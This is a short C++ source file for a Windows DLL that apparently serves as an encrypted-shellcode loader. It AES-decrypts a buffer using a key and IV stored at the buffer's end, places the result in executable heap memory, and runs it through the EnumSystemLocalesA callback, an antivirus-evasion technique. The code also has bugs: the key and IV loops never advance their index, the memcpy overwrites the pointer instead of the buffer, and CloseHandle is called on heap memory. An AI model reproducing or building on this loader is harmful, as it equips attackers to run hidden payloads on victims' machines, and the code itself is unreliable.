#define WIN32_LEAN_AND_MEAN

#include <Windows.h>

#include "aes.h"
#include "filters.h"
#include "modes.h"

#ifdef _DEBUG
#pragma comment(lib, "cryptlib")
#else
#pragma comment(lib, "cryptlibRelease")
#endif

#ifdef LOADER_EXPORTS
#define LOADER_API __declspec(dllexport)
#else
#define LOADER_API __declspec(dllimport)
#endif

extern "C" LOADER_API
void Run(BYTE* cryptBuffer, SIZE_T cryptBufferSize)
{
    BYTE key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {0}, iv[CryptoPP::AES::BLOCKSIZE] = {0};
    DWORD c = 0;
	
    for (DWORD i = cryptBufferSize - 32; i < cryptBufferSize - 16; i++)
    {
        key[c] = cryptBuffer[i];
    }

    c = 0;

    for (DWORD i = cryptBufferSize - 16; i < cryptBufferSize; i++)
    {
        iv[c] = cryptBuffer[i];
    }
	
    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));

    std::vector<BYTE> plainBuffer;
    plainBuffer.resize(cryptBufferSize);

    CryptoPP::ArraySink rs(&plainBuffer[0], plainBuffer.size());

    const DWORD extra = CryptoPP::AES::BLOCKSIZE + CryptoPP::AES::DEFAULT_KEYLENGTH;
	
    CryptoPP::ArraySource s(
        cryptBuffer,
        cryptBufferSize - extra,
        true,
        new CryptoPP::StreamTransformationFilter(
            dec,
            new CryptoPP::Redirector(rs)
        )
    );

    plainBuffer.resize(rs.TotalPutLength());

    void* ha = nullptr;
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (hc)
    {
        ha = HeapAlloc(hc, 0, plainBuffer.size());
    }

    if (ha)
    {
        memcpy(&ha, plainBuffer.data(), plainBuffer.size());
        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
        CloseHandle(ha);
    }
}
